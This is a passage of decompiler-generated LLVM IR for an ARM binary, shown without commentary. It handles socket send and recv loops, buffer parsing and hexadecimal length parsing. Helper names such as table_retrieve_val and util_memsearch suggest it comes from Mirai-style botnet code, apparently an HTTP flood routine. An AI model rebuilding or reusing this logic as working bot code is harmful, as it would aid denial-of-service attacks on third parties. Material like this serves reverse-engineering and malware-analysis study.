  store i1 %v2_9388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9388, label %dec_label_pc_9dc8, label %dec_label_pc_9390

dec_label_pc_9390:                                ; preds = %dec_label_pc_9378, %dec_label_pc_9dc8
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_9394 = load i32, i32* @r6, align 4
  %v1_9394 = add i32 %v0_9394, -1452
  %v2_9394 = inttoptr i32 %v1_9394 to i32*
  %v3_9394 = load i32, i32* %v2_9394, align 4
  store i32 %v3_9394, i32* @r4, align 4
  %v2_9398 = call i32 @util_strlen(i8* %v1_8ffc)
  store i32 %stack_var_-20860.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v2_9398, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_93a8 = load i32, i32* @r4, align 4
  store i32 %v0_93a8, i32* %r0.global-to-local, align 4
  %v4_93ac = call i32 @__libc_send(i32 %v0_93a8, i32 %stack_var_-20860.0.ph, i32 %v2_9398, i32 16384)
  store i32 %v4_93ac, i32* %r0.global-to-local, align 4
  %v0_93b0 = load i32, i32* @r6, align 4
  %v1_93b0 = add i32 %v0_93b0, -1452
  %v2_93b0 = inttoptr i32 %v1_93b0 to i32*
  %v3_93b0 = load i32, i32* %v2_93b0, align 4
  store i32 %v3_93b0, i32* %ip.global-to-local, align 4
  %v3_93b8 = udiv i32 %v3_93b0, 32
  store i32 %v2_8e1c, i32* %r1.global-to-local, align 4
  %v3_93c0 = mul nuw nsw i32 %v3_93b8, 4
  %v2_93c4 = add i32 %v3_93c0, %v2_8e1c
  store i32 %v2_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v2_93c4, -164
  %v2_93c8 = inttoptr i32 %v1_93c8 to i32*
  %v3_93c8 = load i32, i32* %v2_93c8, align 4
  %v1_93d0 = urem i32 %v3_93b0, 32
  store i32 %v1_93d0, i32* %r0.global-to-local, align 4
  %v7_93d4 = shl i32 1, %v1_93d0
  %v8_93d4 = or i32 %v3_93c8, %v7_93d4
  store i32 %v8_93d4, i32* @r1, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v8_93d4, i32* %v2_93c8, align 4
  %v0_93e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_93e0 = trunc i32 %v0_93e0 to i8
  %v2_93e0 = load i32, i32* @r6, align 4
  %v3_93e0 = add i32 %v2_93e0, -1448
  %v4_93e0 = inttoptr i32 %v3_93e0 to i8*
  store i8 %v1_93e0, i8* %v4_93e0, align 1
  %v0_93e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_93e4 = load i32, i32* @r8, align 4
  %v2_93e4 = sub i32 %v0_93e4, %v1_93e4
  %v3_93e4 = icmp uge i32 %v0_93e4, %v1_93e4
  store i1 %v3_93e4, i1* %cpsr_c.global-to-local, align 1
  %v4_93e4 = xor i32 %v1_93e4, %v0_93e4
  %v5_93e4 = xor i32 %v2_93e4, %v0_93e4
  %v6_93e4 = and i32 %v5_93e4, %v4_93e4
  %v7_93e4 = icmp slt i32 %v6_93e4, 0
  %v8_93e4 = icmp slt i32 %v2_93e4, 0
  %v9_93e4 = icmp eq i32 %v0_93e4, %v1_93e4
  store i1 %v9_93e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8c3c, i32* %r2.global-to-local, align 4
  %v3_93ec = xor i1 %v8_93e4, %v7_93e4
  %v4_93ec = or i1 %v9_93e4, %v3_93ec
  br i1 %v4_93ec, label %bb180, label %bb179

bb179:                                            ; preds = %dec_label_pc_9390
  %v6_93ec = add i32 %v0_93e4, 1
  store i32 %v6_93ec, i32* @r8, align 4
  br label %bb180

bb180:                                            ; preds = %dec_label_pc_9390, %bb179
  %v1_93f0 = load i32, i32* @r6, align 4
  %v2_93f0 = add i32 %v1_93f0, -1440
  %v3_93f0 = inttoptr i32 %v2_93f0 to i32*
  store i32 %v2_8c3c, i32* %v3_93f0, align 4
  br label %dec_label_pc_8d00

dec_label_pc_93f8:                                ; preds = %dec_label_pc_8cb8
  %v1_93f8 = add i32 %v3_8fbc, -1444
  %v2_93f8 = inttoptr i32 %v1_93f8 to i32*
  %v3_93f8 = load i32, i32* %v2_93f8, align 4
  store i32 %v2_8c3c, i32* @r1, align 4
  %v2_9400 = sub i32 %v2_8c3c, %v3_93f8
  store i32 %v2_9400, i32* %r3.global-to-local, align 4
  %v2_9404 = icmp ugt i32 %v2_9400, 29
  store i1 %v2_9404, i1* %cpsr_c.global-to-local, align 1
  %v7_9404 = icmp eq i32 %v2_9400, 30
  store i1 %v7_9404, i1* %cpsr_z.global-to-local, align 1
  %v2_9408 = xor i1 %v7_9404, true
  %v3_9408 = and i1 %v2_9404, %v2_9408
  br i1 %v3_9408, label %dec_label_pc_8ce8, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93f8
  %v2_940c = inttoptr i32 %v1_8d24 to i32*
  %v3_940c = load i32, i32* %v2_940c, align 4
  store i32 %v3_940c, i32* %ip.global-to-local, align 4
  %v3_9414 = udiv i32 %v3_940c, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_9418 = mul nuw nsw i32 %v3_9414, 4
  store i32 %v3_9418, i32* %r2.global-to-local, align 4
  store i32 %v2_8e1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8e24

dec_label_pc_9428:                                ; preds = %dec_label_pc_8cc8
  %v2_9428 = inttoptr i32 %v1_8d24 to i32*
  %v3_9428 = load i32, i32* %v2_9428, align 4
  store i32 %v3_9428, i32* %ip.global-to-local, align 4
  %v3_9430 = udiv i32 %v3_9428, 32
  store i32 %v2_8e1c, i32* %r3.global-to-local, align 4
  %v3_9438 = mul nuw nsw i32 %v3_9430, 4
  %v2_943c = add i32 %v3_9438, %v2_8e1c
  store i32 %v2_943c, i32* %r2.global-to-local, align 4
  %v1_9440 = add i32 %v2_943c, -164
  %v2_9440 = inttoptr i32 %v1_9440 to i32*
  %v3_9440 = load i32, i32* %v2_9440, align 4
  %v1_9444 = urem i32 %v3_9428, 32
  store i32 %v1_9444, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_944c = shl i32 1, %v1_9444
  %v8_944c = or i32 %v3_9440, %v7_944c
  store i32 %v8_944c, i32* @r1, align 4
  %v1_9450 = load i32, i32* @r8, align 4
  %v2_9450 = sub i32 %v3_9428, %v1_9450
  %v3_9450 = icmp uge i32 %v3_9428, %v1_9450
  store i1 %v3_9450, i1* %cpsr_c.global-to-local, align 1
  %v4_9450 = xor i32 %v1_9450, %v3_9428
  %v5_9450 = xor i32 %v2_9450, %v3_9428
  %v6_9450 = and i32 %v5_9450, %v4_9450
  %v7_9450 = icmp slt i32 %v6_9450, 0
  %v8_9450 = icmp slt i32 %v2_9450, 0
  %v9_9450 = icmp eq i32 %v3_9428, %v1_9450
  store i1 %v9_9450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_944c, i32* %v2_9440, align 4
  %v3_9458 = xor i1 %v8_9450, %v7_9450
  %v4_9458 = or i1 %v9_9450, %v3_9458
  br i1 %v4_9458, label %dec_label_pc_8d00, label %dec_label_pc_945c

dec_label_pc_945c:                                ; preds = %dec_label_pc_9428
  %v0_945c = load i32, i32* %ip.global-to-local, align 4
  %v1_945c = load i32, i32* %r3.global-to-local, align 4
  %v2_945c = add i32 %v1_945c, %v0_945c
  store i32 %v2_945c, i32* @r8, align 4
  br label %dec_label_pc_8e44

dec_label_pc_9464:                                ; preds = %dec_label_pc_8ee8
  %v0_9464 = call i32 @__GI___errno_location()
  store i32 %v0_9464, i32* %r0.global-to-local, align 4
  %v0_9468 = load i32, i32* @sl, align 4
  %v1_9468 = add i32 %v0_9468, 660
  %v2_9468 = inttoptr i32 %v1_9468 to i32*
  %v3_9468 = load i32, i32* %v2_9468, align 4
  store i32 %v3_9468, i32* @r3, align 4
  %v0_946c = load i32, i32* %sb.global-to-local, align 4
  %v2_9470 = icmp ugt i32 %v3_9468, 1023
  store i1 %v2_9470, i1* %cpsr_c.global-to-local, align 1
  %v7_9470 = icmp eq i32 %v3_9468, 1024
  store i1 %v7_9470, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_9464, i32* %fp.global-to-local, align 4
  %v1_9478 = add i32 %v0_946c, 2116
  store i32 %v1_9478, i32* @r7, align 4
  br i1 %v7_9470, label %dec_label_pc_957c, label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %dec_label_pc_9464, %dec_label_pc_957c, %dec_label_pc_9570
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9484 = load i32, i32* %fp.global-to-local, align 4
  %v2_9484 = inttoptr i32 %v1_9484 to i32*
  store i32 0, i32* %v2_9484, align 4
  %v0_9488 = load i32, i32* @sl, align 4
  %v1_9488 = add i32 %v0_9488, 660
  %v2_9488 = inttoptr i32 %v1_9488 to i32*
  %v3_9488 = load i32, i32* %v2_9488, align 4
  store i32 %v3_9488, i32* %r1.global-to-local, align 4
  %v1_948c = add i32 %v0_9488, -1452
  %v2_948c = inttoptr i32 %v1_948c to i32*
  %v3_948c = load i32, i32* %v2_948c, align 4
  store i32 %v3_948c, i32* %r0.global-to-local, align 4
  %v1_9490 = sub i32 1024, %v3_9488
  store i32 %v1_9490, i32* %r2.global-to-local, align 4
  %v0_9494 = load i32, i32* %r3.global-to-local, align 4
  %v1_9494 = add i32 %v0_9494, 16384
  store i32 %v1_9494, i32* %r3.global-to-local, align 4
  %v0_9498 = load i32, i32* @r7, align 4
  %v2_9498 = add i32 %v0_9498, %v3_9488
  store i32 %v2_9498, i32* %r1.global-to-local, align 4
  %v4_949c = call i32 @__libc_recv(i32 %v3_948c, i32 %v2_9498, i32 %v1_9490, i32 %v1_9494)
  store i32 %v4_949c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94a0 = icmp eq i32 %v4_949c, 0
  store i1 %v2_94a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94a0, label %dec_label_pc_9dd8, label %dec_label_pc_94a8

dec_label_pc_94a8:                                ; preds = %dec_label_pc_9480
  %v2_94a8 = icmp eq i32 %v4_949c, -1
  store i1 %v2_94a8, i1* %cpsr_c.global-to-local, align 1
  %v7_94a8 = icmp eq i32 %v4_949c, -1
  store i1 %v7_94a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94a8, label %dec_label_pc_9dfc, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a8
  %v0_94b0 = load i32, i32* @sl, align 4
  %v1_94b0 = add i32 %v0_94b0, 660
  %v2_94b0 = inttoptr i32 %v1_94b0 to i32*
  %v3_94b0 = load i32, i32* %v2_94b0, align 4
  store i32 %v2_8ea8, i32* %r1.global-to-local, align 4
  %v2_94b8 = add i32 %v3_94b0, %v4_949c
  store i32 %v2_94b8, i32* @r4, align 4
  store i32 %v2_94b8, i32* %v2_94b0, align 4
  %v0_94c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_94c0 = load i32, i32* @sl, align 4
  %v2_94c0 = add i32 %v1_94c0, -1444
  %v3_94c0 = inttoptr i32 %v2_94c0 to i32*
  store i32 %v0_94c0, i32* %v3_94c0, align 4
  br label %dec_label_pc_9550

dec_label_pc_94c8:                                ; preds = %dec_label_pc_9550
  %v1_94c8 = inttoptr i32 %v0_9550 to i32*
  %v2_94c8 = load i32, i32* %v1_94c8, align 4
  store i32 %v2_94c8, i32* @r8, align 4
  %v1_94cc = load i32, i32* @r4, align 4
  %v5_94d0 = icmp slt i32 %v3_9550, %v1_94cc
  %storemerge49 = select i1 %v5_94d0, i32 %v3_9550, i32 %v1_94cc
  store i32 %storemerge49, i32* @r6, align 4
  %v2_94d8 = sub i32 %v3_9550, %storemerge49
  store i32 %v2_94d8, i32* %r3.global-to-local, align 4
  %v2_94dc = icmp ne i32 %v2_94c8, 0
  store i1 %v2_94dc, i1* %cpsr_c.global-to-local, align 1
  %v7_94dc = icmp eq i32 %v2_94c8, 1
  store i1 %v7_94dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_94d8, i32* %v2_9550, align 4
  br i1 %v7_94dc, label %dec_label_pc_95a0, label %.dec_label_pc_94ecthread-pre-split_crit_edge

.dec_label_pc_94ecthread-pre-split_crit_edge:     ; preds = %dec_label_pc_94c8
  %v1_94e4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_94e4, i32* @r5, align 4
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_955c, %.dec_label_pc_94ecthread-pre-split_crit_edge, %dec_label_pc_95c8
  %v0_94ec = phi i32 [ %v3_95c8, %dec_label_pc_95c8 ], [ %v1_94e4, %.dec_label_pc_94ecthread-pre-split_crit_edge ], [ %v3_9550, %dec_label_pc_955c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94ec = icmp eq i32 %v0_94ec, 0
  store i1 %v2_94ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_94ec, label %dec_label_pc_94f4, label %dec_label_pc_9514

dec_label_pc_94f4:                                ; preds = %dec_label_pc_94ec
  %v0_94f4 = load i32, i32* @sl, align 4
  %v1_94f4 = add i32 %v0_94f4, 8
  %v2_94f4 = inttoptr i32 %v1_94f4 to i32*
  %v3_94f4 = load i32, i32* %v2_94f4, align 4
  store i32 %v3_94f4, i32* @r4, align 4
  %v2_94f8 = icmp ne i32 %v3_94f4, 0
  store i1 %v2_94f8, i1* %cpsr_c.global-to-local, align 1
  %v7_94f8 = icmp eq i32 %v3_94f4, 1
  store i1 %v7_94f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_94f8, label %dec_label_pc_95d0, label %dec_label_pc_9500

dec_label_pc_9500:                                ; preds = %dec_label_pc_94f4
  %v1_9500 = add i32 %v0_94f4, 660
  %v2_9500 = inttoptr i32 %v1_9500 to i32*
  %v3_9500 = load i32, i32* %v2_9500, align 4
  %v0_9504 = load i32, i32* @r6, align 4
  %v2_9504 = sub i32 %v3_9500, %v0_9504
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9508 = icmp eq i32 %v2_9504, 0
  store i1 %v2_9508, i1* %cpsr_z.global-to-local, align 1
  %v2_950c = add i32 %v0_94f4, 12
  %v3_950c = inttoptr i32 %v2_950c to i32*
  store i32 %v2_9504, i32* %v3_950c, align 4
  br i1 %v2_9508, label %dec_label_pc_9dbc, label %dec_label_pc_9514

dec_label_pc_9514:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_95d0, %dec_label_pc_9500, %dec_label_pc_9658
  %v0_9514 = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9514 = icmp eq i32 %v0_9514, 0
  store i1 %v2_9514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9514, label %dec_label_pc_9564, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_9514
  %v0_951c = load i32, i32* @sl, align 4
  %v1_951c = add i32 %v0_951c, 660
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  store i32 %v3_951c, i32* @r3, align 4
  %v2_9520 = sub i32 %v3_951c, %v0_9514
  store i32 %v2_9520, i32* @r4, align 4
  store i32 %v2_9520, i32* @r2, align 4
  store i32 %v2_9520, i32* %v2_951c, align 4
  %v0_952c = load i32, i32* @r7, align 4
  %v1_952c = load i32, i32* @r6, align 4
  %v2_952c = add i32 %v1_952c, %v0_952c
  store i32 %v2_952c, i32* @r1, align 4
  store i32 %v0_952c, i32* @r0, align 4
  %v3_9534 = call i32 @memmove(i32 %v0_952c, i32 %v2_952c, i32 %v2_9520)
  store i32 %v3_9534, i32* %r0.global-to-local, align 4
  %v0_9538 = load i32, i32* @sl, align 4
  %v1_9538 = add i32 %v0_9538, 660
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9540 = load i32, i32* %sb.global-to-local, align 4
  %v2_9540 = add i32 %v0_9540, %v3_9538
  store i32 %v2_9540, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9544 = icmp eq i32 %v3_9538, 0
  store i1 %v2_9544, i1* %cpsr_z.global-to-local, align 1
  %v3_9548 = add i32 %v2_9540, 2116
  %v4_9548 = inttoptr i32 %v3_9548 to i8*
  store i8 0, i8* %v4_9548, align 1
  %v0_954c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_954c, label %dec_label_pc_9564, label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_951c, %dec_label_pc_94b0
  %v0_9550 = load i32, i32* @sl, align 4
  %v1_9550 = add i32 %v0_9550, 12
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  %v3_9550 = load i32, i32* %v2_9550, align 4
  store i32 %v3_9550, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9554 = icmp eq i32 %v3_9550, 0
  store i1 %v2_9554, i1* %cpsr_z.global-to-local, align 1
  %v5_9558 = icmp sgt i32 %v3_9550, 0
  br i1 %v5_9558, label %dec_label_pc_94c8, label %dec_label_pc_955c

dec_label_pc_955c:                                ; preds = %dec_label_pc_9550
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_94ec

dec_label_pc_9564:                                ; preds = %dec_label_pc_951c, %dec_label_pc_9514
  %v0_9564 = load i32, i32* @sl, align 4
  %v1_9564 = add i32 %v0_9564, -1448
  %v2_9564 = inttoptr i32 %v1_9564 to i8*
  %v3_9564 = load i8, i8* %v2_9564, align 1
  %v4_9564 = zext i8 %v3_9564 to i32
  store i32 %v4_9564, i32* %r3.global-to-local, align 4
  %v2_9568 = icmp ugt i8 %v3_9564, 6
  store i1 %v2_9568, i1* %cpsr_c.global-to-local, align 1
  %v7_9568 = icmp eq i8 %v3_9564, 7
  store i1 %v7_9568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9568, label %dec_label_pc_9570, label %dec_label_pc_8ef8

dec_label_pc_9570:                                ; preds = %dec_label_pc_9564
  %v1_9570 = add i32 %v0_9564, 660
  %v2_9570 = inttoptr i32 %v1_9570 to i32*
  %v3_9570 = load i32, i32* %v2_9570, align 4
  store i32 %v3_9570, i32* @r3, align 4
  %v2_9574 = icmp ugt i32 %v3_9570, 1023
  store i1 %v2_9574, i1* %cpsr_c.global-to-local, align 1
  %v7_9574 = icmp eq i32 %v3_9570, 1024
  store i1 %v7_9574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9574, label %dec_label_pc_957c.loopexit, label %dec_label_pc_9480

dec_label_pc_957c.loopexit:                       ; preds = %dec_label_pc_9570
  %v0_957c.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_9584.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_957c

dec_label_pc_957c:                                ; preds = %dec_label_pc_957c.loopexit, %dec_label_pc_9464
  %v0_9584 = phi i32 [ %v0_9584.pre, %dec_label_pc_957c.loopexit ], [ %v1_9478, %dec_label_pc_9464 ]
  %v0_957c = phi i32 [ %v0_957c.pre, %dec_label_pc_957c.loopexit ], [ %v0_946c, %dec_label_pc_9464 ]
  %v1_9580 = add i32 %v0_957c, 2180
  store i32 %v1_9580, i32* @r1, align 4
  store i32 %v0_9584, i32* @r0, align 4
  store i32 960, i32* @r2, align 4
  %v3_958c = call i32 @memmove(i32 %v0_9584, i32 %v1_9580, i32 960)
  store i32 %v3_958c, i32* %r0.global-to-local, align 4
  %v0_9590 = load i32, i32* @sl, align 4
  %v1_9590 = add i32 %v0_9590, 660
  %v2_9590 = inttoptr i32 %v1_9590 to i32*
  %v3_9590 = load i32, i32* %v2_9590, align 4
  store i32 %v3_9590, i32* %r3.global-to-local, align 4
  %v1_9594 = add i32 %v3_9590, -64
  store i32 %v1_9594, i32* @r4, align 4
  store i32 %v1_9594, i32* %v2_9590, align 4
  br label %dec_label_pc_9480

dec_label_pc_95a0:                                ; preds = %dec_label_pc_94c8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_95a8 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_95ac = load i32, i32* @r4, align 4
  store i32 %v0_95ac, i32* %r1.global-to-local, align 4
  store i32 %v3_95a8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_95b8 = load i32, i32* @r7, align 4
  store i32 %v0_95b8, i32* %r0.global-to-local, align 4
  %v4_95bc = call i32 @util_memsearch(i32 %v0_95b8, i32 %v0_95ac, i32 %v3_95a8, i32 11)
  store i32 %v4_95bc, i32* %r0.global-to-local, align 4
  %v3_95c0 = icmp eq i32 %v4_95bc, -1
  store i1 %v3_95c0, i1* %cpsr_c.global-to-local, align 1
  %v8_95c0 = icmp eq i32 %v4_95bc, -1
  store i1 %v8_95c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_95c0, label %dec_label_pc_95c8, label %dec_label_pc_a098

dec_label_pc_95c8:                                ; preds = %dec_label_pc_95a0
  %v0_95c8 = load i32, i32* @sl, align 4
  %v1_95c8 = add i32 %v0_95c8, 12
  %v2_95c8 = inttoptr i32 %v1_95c8 to i32*
  %v3_95c8 = load i32, i32* %v2_95c8, align 4
  store i32 %v3_95c8, i32* @r5, align 4
  br label %dec_label_pc_94ec

dec_label_pc_95d0:                                ; preds = %dec_label_pc_94f4
  %v0_95d0 = load i32, i32* @r7, align 4
  store i32 %v0_95d0, i32* %r0.global-to-local, align 4
  %v1_95d4 = add i32 %v0_94f4, 660
  %v2_95d4 = inttoptr i32 %v1_95d4 to i32*
  %v3_95d4 = load i32, i32* %v2_95d4, align 4
  store i32 %v3_95d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95e0 = call i32 @util_memsearch(i32 %v0_95d0, i32 %v3_95d4, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  store i32 %v5_95e0, i32* %r0.global-to-local, align 4
  %v2_95e4 = icmp eq i32 %v5_95e0, -1
  store i1 %v2_95e4, i1* %cpsr_c.global-to-local, align 1
  %v7_95e4 = icmp eq i32 %v5_95e0, -1
  store i1 %v7_95e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95e4, label %dec_label_pc_9514, label %dec_label_pc_95ec

dec_label_pc_95ec:                                ; preds = %dec_label_pc_95d0
  %v0_95ec = load i32, i32* @sl, align 4
  %v1_95ec = add i32 %v0_95ec, 660
  %v2_95ec = inttoptr i32 %v1_95ec to i32*
  %v3_95ec = load i32, i32* %v2_95ec, align 4
  store i32 %v3_95ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_95f8 = load i32, i32* @r7, align 4
  store i32 %v0_95f8, i32* %r0.global-to-local, align 4
  %v5_95fc = call i32 @util_memsearch(i32 %v0_95f8, i32 %v3_95ec, i32 ptrtoint ([3 x i8]* @global_var_1b3ac.69 to i32), i32 2)
  %v0_9600 = load i32, i32* %sb.global-to-local, align 4
  %v2_9600 = add i32 %v0_9600, %v5_95fc
  store i32 %v2_9600, i32* %ip.global-to-local, align 4
  store i32 %v5_95fc, i32* @r6, align 4
  store i32 %v5_95fc, i32* %r1.global-to-local, align 4
  %v0_960c = load i32, i32* @r7, align 4
  store i32 %v0_960c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32* %r2.global-to-local, align 4
  %v0_9614 = load i32, i32* @r4, align 4
  store i32 %v0_9614, i32* %r3.global-to-local, align 4
  %v0_9618 = load i32, i32* @r5, align 4
  %v1_9618 = trunc i32 %v0_9618 to i8
  %v3_9618 = add i32 %v2_9600, 2114
  %v4_9618 = inttoptr i32 %v3_9618 to i8*
  store i8 %v1_9618, i8* %v4_9618, align 1
  %v4_961c = call i32 @util_memsearch(i32 %v0_960c, i32 %v5_95fc, i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32 %v0_9614)
  store i32 %v4_961c, i32* %r0.global-to-local, align 4
  %v2_9620 = icmp eq i32 %v4_961c, -1
  store i1 %v2_9620, i1* %cpsr_c.global-to-local, align 1
  %v7_9620 = icmp eq i32 %v4_961c, -1
  store i1 %v7_9620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9620, label %dec_label_pc_9644, label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_95ec
  %v0_9628 = load i32, i32* @r7, align 4
  store i32 %v0_9628, i32* %r0.global-to-local, align 4
  %v0_962c = load i32, i32* @r6, align 4
  store i32 %v0_962c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32* %r2.global-to-local, align 4
  %v0_9634 = load i32, i32* @r4, align 4
  store i32 %v0_9634, i32* %r3.global-to-local, align 4
  %v4_9638 = call i32 @util_memsearch(i32 %v0_9628, i32 %v0_962c, i32 ptrtoint (i32* @global_var_1b3d8.75 to i32), i32 %v0_9634)
  %v0_963c = load i32, i32* %sb.global-to-local, align 4
  %v2_963c = add i32 %v0_963c, %v4_9638
  store i32 %v2_963c, i32* %r0.global-to-local, align 4
  %v0_9640 = load i32, i32* @r5, align 4
  %v1_9640 = trunc i32 %v0_9640 to i8
  %v3_9640 = add i32 %v2_963c, 2116
  %v4_9640 = inttoptr i32 %v3_9640 to i8*
  store i8 %v1_9640, i8* %v4_9640, align 1
  br label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %dec_label_pc_95ec, %dec_label_pc_9628
  %v0_9644 = load i32, i32* @r7, align 4
  store i32 %v0_9644, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_964c = inttoptr i32 %v0_9644 to i8*
  %v3_964c = call i32 @util_atoi(i8* %v2_964c, i32 16)
  store i32 %v3_964c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9650 = icmp eq i32 %v3_964c, 0
  store i1 %v2_9650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9650, label %dec_label_pc_a24c, label %dec_label_pc_9658

dec_label_pc_9658:                                ; preds = %dec_label_pc_9644
  %v1_9658 = add i32 %v3_964c, 2
  store i32 %v1_9658, i32* %r3.global-to-local, align 4
  %v1_965c = load i32, i32* @sl, align 4
  %v2_965c = add i32 %v1_965c, 12
  %v3_965c = inttoptr i32 %v2_965c to i32*
  store i32 %v1_9658, i32* %v3_965c, align 4
  br label %dec_label_pc_9514

dec_label_pc_9664:                                ; preds = %dec_label_pc_8cd0
  %v2_9664 = inttoptr i32 %v1_8d24 to i32*
  %v3_9664 = load i32, i32* %v2_9664, align 4
  store i32 %v3_9664, i32* %ip.global-to-local, align 4
  %v3_966c = udiv i32 %v3_9664, 32
  %v3_9670 = mul nuw nsw i32 %v3_966c, 4
  store i32 %v2_8e1c, i32* @lr, align 4
  %v2_9678 = add i32 %v3_9670, %v2_8e1c
  store i32 %v2_9678, i32* %r2.global-to-local, align 4
  %v1_967c = add i32 %v2_9678, -164
  %v2_967c = inttoptr i32 %v1_967c to i32*
  %v3_967c = load i32, i32* %v2_967c, align 4
  %v1_9680 = urem i32 %v3_9664, 32
  store i32 %v1_9680, i32* %r0.global-to-local, align 4
  store i32 %v1_8cc8, i32* %r3.global-to-local, align 4
  %v7_9688 = shl i32 %v1_8cc8, %v1_9680
  %v8_9688 = or i32 %v3_967c, %v7_9688
  store i32 %v8_9688, i32* @r1, align 4
  %v1_968c = load i32, i32* @r8, align 4
  %v2_968c = sub i32 %v3_9664, %v1_968c
  %v3_968c = icmp uge i32 %v3_9664, %v1_968c
  store i1 %v3_968c, i1* %cpsr_c.global-to-local, align 1
  %v4_968c = xor i32 %v1_968c, %v3_9664
  %v5_968c = xor i32 %v2_968c, %v3_9664
  %v6_968c = and i32 %v5_968c, %v4_968c
  %v7_968c = icmp slt i32 %v6_968c, 0
  %v8_968c = icmp slt i32 %v2_968c, 0
  %v9_968c = icmp eq i32 %v3_9664, %v1_968c
  store i1 %v9_968c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_9688, i32* %v2_967c, align 4
  %v3_9694 = xor i1 %v8_968c, %v7_968c
  %v4_9694 = or i1 %v9_968c, %v3_9694
  br i1 %v4_9694, label %dec_label_pc_8d00, label %dec_label_pc_9698

dec_label_pc_9698:                                ; preds = %dec_label_pc_9664
  %v0_9698 = load i32, i32* %ip.global-to-local, align 4
  %v1_9698 = load i32, i32* %r3.global-to-local, align 4
  %v2_9698 = add i32 %v1_9698, %v0_9698
  store i32 %v2_9698, i32* @r8, align 4
  br label %dec_label_pc_8e44

dec_label_pc_96a0:                                ; preds = %dec_label_pc_8f54
  store i32 %v3_8f98, i32* %r0.global-to-local, align 4
  %v1_96a4 = call i32 @__GI___libc_close(i32 %v3_8f98)
  store i32 %v1_96a4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_96ac = load i32, i32* @sl, align 4
  %v2_96ac = add i32 %v1_96ac, -1452
  %v3_96ac = inttoptr i32 %v2_96ac to i32*
  store i32 -1, i32* %v3_96ac, align 4
  %v0_96b0 = load i32, i32* @r5, align 4
